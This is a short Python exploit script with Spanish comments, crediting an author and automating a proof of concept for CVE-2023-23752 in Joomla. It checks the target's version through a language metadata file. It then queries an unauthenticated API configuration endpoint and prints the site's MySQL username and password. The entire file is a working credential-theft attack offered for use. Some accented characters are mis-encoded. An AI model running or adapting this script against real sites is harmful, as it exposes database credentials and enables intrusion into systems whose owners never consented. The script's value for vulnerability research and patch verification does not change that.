# !/bin/python3
# Exploit Author: Jorge Reyes
# Date: 14 Decemeber 2023
# CVE : CVE-2023-23752
# Automatizacion de la prueba de concepto de el articulo: https://vulncheck.com/blog/joomla-for-rce

import sys
import requests
import json


def version(url):
    ruta = url+'/language/en-GB/langmetadata.xml'
    respuesta = requests.get(ruta)
    if respuesta.status_code == 200:
        version = None
        for linea in respuesta.text.split('\n'):
            if '<version>' in linea and '</version>' in linea:
                version=int(linea.replace('<version>', '').replace('</version>', '').replace('.','').strip())
        if version is not None:
            return version
        else:
            print('No se puede confirmar la versi칩n, se intentar치 de todas maneras')
            return 400
    else:
        print ('No se puede conectar con el host')
        return 1

def explotacion(url):
    ruta = url+'/api/index.php/v1/config/application?public=true' 
    respuesta = requests.get(ruta)
    if respuesta.status_code == 200:
        datosJson = json.loads(respuesta.text)
        usuario = None
        contrasena = None
        for valor in datosJson.get('data', []):
            atributos = valor.get('attributes', {})
            if 'user' in atributos:
                usuario = atributos['user']
            elif 'password' in atributos:
                contrasena = atributos['password']
        if usuario is not None and contrasena is not None:
            print('Usuario de la base MySQL:', usuario)
            print('Contrase침a de la base MySQL:', contrasena)
        else:
            print('No se encontr칩 la informacion')
    else:
        print('No se puede extraer la informacion')

if __name__=='__main__':

    if len(sys.argv) != 2:
        print ('Uso: pytho3 poc.py url')
    else: 
        url = sys.argv[1]
        verificacion=version(url)
        if verificacion >= 400 and verificacion <= 427:
            print ('Version vulnerable, iniciando extraccion de informacion.')
            explotacion(url)
        else:
            print('La version de joomla no es vulnerable')
